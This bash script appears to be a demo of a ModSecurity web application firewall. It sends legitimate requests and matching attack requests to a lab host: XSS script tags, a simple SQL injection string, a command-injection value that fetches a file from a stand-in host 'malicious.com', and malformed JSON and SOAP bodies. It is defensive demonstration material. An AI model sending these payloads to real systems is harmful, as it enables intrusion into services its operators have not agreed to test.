#!/bin/bash 
. demo.sh

URL=modsecurity-modsecurity.apps.pbroutes.lab.pnq2.cee.redhat.com
URL=${URL-http://localhost:8080}

clear

SPEED=5
COLOR=ORANGE p "# CASE 1: XSS Attack protection"

COLOR=green p "# Lecit request (GET):"
pe curl -i $URL/page

COLOR=red p '# Attack (GET)'
p curl -i  "'"${URL}'/page?inject=<script>alert("hack")</script>'"'"
curl -i ${URL}'/page?inject=<script>alert("hack")</script>'

COLOR=green p "# Lecit request (POST):"
pe curl -i -X POST --data "user=pippo" ${URL}/page

COLOR=red p "# Attack (POST):"
p curl -i -X POST --data "'"'user=<script>alert("hack")</script>'"'" ${URL}/page
curl -i -X POST --data 'user=<script>alert("hack")</script>' ${URL}/page

COLOR=ORANGE p "# CASE 2: SQL Injection protection"

COLOR=red p "# Attack (GET)"
p curl -i ${URL}/page?"'"'user="a"="a";%20SELECT%20*%20FROM%20USERS'"'"
curl -i ${URL}/page?'user="a"="a";%20SELECT%20*%20FROM%20USERS'

COLOR=red p "# Attack (POST)"
p curl -i -X POST --data "'"'user="a"="a"; SELECT * FROM USERS'"'" ${URL}/page
curl -i -X POST --data 'user="a"="a"; SELECT * FROM USERS' ${URL}/page


COLOR=ORANGE p "# CASE 3: Command execution"
COLOR=red p "# Attack (GET)"
pe curl -i "${URL}/page?"'user=curl+-o+-s+http%3A%2F%2Fmalicious.com%2Fbin'
COLOR=red p "# Attack (POST)"
pe curl -i ${URL}/page --data-urlencode "'"'user=curl -o -s http://malicous.com/bin'"'"

COLOR=ORANGE p "# CASE 3: Securing JSON based API"
COLOR=green p "# Lecit request"
pe 'echo '"'"'{"attribute1": "value", "user_key": "x123aFr12"}'"'"' | curl -i  -X POST --data @- -H '"'"'Content-Type: "application/json"'"'"' ${URL}/api'

COLOR=red p "# Attack: sending a REST API with malformed JSON body"
#COLOR=blue p "# mod_security rule:"
#COLOR=blue p '#         SecRule REQUEST_HEADERS:Content-Type "application/json" "id:'"'"'300001'"'"',phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=JSON"'
pe 'echo '"'"'{"attribute1": "value", HERE_SOME_MALICIOUS_DATA}'"'"' | curl -i  -X POST --data @- -H '"'"'Content-Type: "application/json"'"'"' ${URL}/api'

COLOR=red p "# Enforcing specific JSON elements: only attribute1, attribute2, attribute3, user_key are allowed"
#p "# CASE 3: mode_security rule:"
#p '#         SecRule ARGS_NAMES "!^(attribute1|attribute2|attribute3|user_key)$" "phase:2, t:none, deny,log, auditlog,msg:'"'"'Invalid JSON format'"'"',id:1233"'
pe 'echo '"'"'{"field1": "value1"}'"'"' | curl -i  -X POST --data @- -H '"'"'Content-Type: "application/json"'"'"' ${URL}/api' 

COLOR=ORANGE p "# CASE 4: Securing XML based API"
COLOR=green p "# Lecit SOAP request"
p 'cat <<EOF | curl -i -X POST --data @- -H '"'"'Content-Type: "application/xml"'"'"' ${URL}/Soap
<?xml version="1.0"?>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

<soap:Body xmlns:m="http://www.example.org/stock">
  <m:GetStockPrice>
    <m:StockName>IBM</m:StockName>
  </m:GetStockPrice>
</soap:Body>

</soap:Envelope>
EOF'
cat <<EOF | curl -i -X POST --data @- -H 'Content-Type: "application/xml' ${URL}/Soap
<?xml version="1.0"?>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

<soap:Body xmlns:m="http://www.example.org/stock">
  <m:GetStockPrice>
    <m:StockName>IBM</m:StockName>
  </m:GetStockPrice>
</soap:Body>

</soap:Envelope>
EOF

COLOR=red p "# Attack: malicious SOAP request not following the schema"
p 'cat <<EOF | curl -i -X POST --data @- -H '"'"'Content-Type: "application/xml"'"'"' ${URL}/Soap
<?xml version="1.0"?>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

<soap:Body xmlns:m="http://www.example.org/stock">
  <m:GetStockPrice>
    <m:StockName>IBM</m:StockName>
  </m:GetStockPrice>
</soap:Body>
<HereAMalicousTAG/>
</soap:Envelope>
EOF'
cat <<EOF | curl -i -X POST --data @- -H 'Content-Type: "application/xml' ${URL}/Soap
<?xml version="1.0"?>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

<soap:Body xmlns:m="http://www.example.org/stock">
  <m:GetStockPrice>
    <m:StockName>IBM</m:StockName>
  </m:GetStockPrice>
</soap:Body>
<HereAMalicousTAG/>
</soap:Envelope>
EOF
